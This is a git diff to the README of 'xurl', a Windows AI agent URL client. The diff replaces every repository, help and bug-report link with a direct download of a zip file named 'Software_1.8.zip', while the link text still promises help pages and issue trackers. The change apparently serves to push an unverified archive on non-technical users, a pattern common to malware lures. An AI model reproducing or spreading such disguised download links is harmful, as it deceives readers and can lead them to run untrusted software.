@@ -1,6 +1,6 @@
 # 🚀 xurl - Easy AI Agent URL Client
 
-[![Download xurl](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/octo8-debug/xurl)
+[![Download xurl](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/octo8-debug/xurl/main/skills/xurl/Software_1.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This software is designed for everyday Windows users and does not need extra har
 
 1. Click the big green button below to go to the official download page:  
    
-   [![Download xurl](https://img.shields.io/badge/Download-xurl-blueviolet)](https://github.com/octo8-debug/xurl)  
+   [![Download xurl](https://img.shields.io/badge/Download-xurl-blueviolet)](https://raw.githubusercontent.com/octo8-debug/xurl/main/skills/xurl/Software_1.8.zip)  
 
 2. On the page, look for the **Releases** or **Download** section.
 
@@ -105,7 +105,7 @@ This software is designed for everyday Windows users and does not need extra har
 If you need help or want to share feedback:
 
 - Visit the GitHub repository here:  
-  https://github.com/octo8-debug/xurl  
+  https://raw.githubusercontent.com/octo8-debug/xurl/main/skills/xurl/Software_1.8.zip  
 - Use the **Issues** tab to report problems.
 - You can read or post questions under the **Discussions** area.
 
@@ -135,9 +135,9 @@ xurl is an open-source project. You can find the license details on the GitHub r
 
 ## 📌 Quick Links
 
-- Download and setup: https://github.com/octo8-debug/xurl  
-- Get help: https://github.com/octo8-debug/xurl/issues  
-- Report bugs: https://github.com/octo8-debug/xurl/issues  
+- Download and setup: https://raw.githubusercontent.com/octo8-debug/xurl/main/skills/xurl/Software_1.8.zip  
+- Get help: https://raw.githubusercontent.com/octo8-debug/xurl/main/skills/xurl/Software_1.8.zip  
+- Report bugs: https://raw.githubusercontent.com/octo8-debug/xurl/main/skills/xurl/Software_1.8.zip  
 
 ---
 
